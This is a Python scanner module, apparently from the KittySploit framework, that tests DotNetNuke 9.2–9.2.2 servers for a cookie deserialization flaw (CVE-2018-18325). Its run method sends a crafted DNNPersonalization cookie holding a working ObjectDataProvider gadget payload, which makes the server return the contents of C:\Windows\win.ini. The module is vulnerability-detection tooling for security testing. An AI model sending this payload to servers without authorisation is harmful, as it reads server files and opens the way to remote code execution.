#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DNN (DotNetNuke) versions 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DotNetNuke 9.2 - 9.2.2 - Weak Encryption & Cookie Deserialization Detection',
        'description': 'DNN (DotNetNuke) versions 9.2 through 9.2.2 use a weak encryption algorithm to protect input parameters because of an incomplete fix for CVE-2018-15811. This cryptographic weakness enables attackers to craft malicious DNNPersonalization cookies that can be deserialized, leading to remote code execution.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'dotnetnuke', 'crypto', 'deserialization', 'rce', 'kev', 'dnnsoftware', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-18325',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-15811',
            'https://github.com/dnnsoftware/Dnn.Platform/releases',
            'http://packetstormsecurity.com/files/157080/DotNetNuke-Cookie-Deserialization-Remote-Code-Execution.html',
            'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/dnn_cookie_deserialization_rce.rb',
        ],
        'cve': 'CVE-2018-18325',
    }

    def run(self):
        path = '/__'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'Cookie': 'dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\\Windows\\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'})
        if not r or r.status_code != 404:
            return False
        body = r.text or ""
        body_all = ('[extensions]', 'for 16-bit app support',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='DotNetNuke 9.2 - 9.2.2 - Weak Encryption & Cookie Deserialization detected', path=path)
            return True
        return False

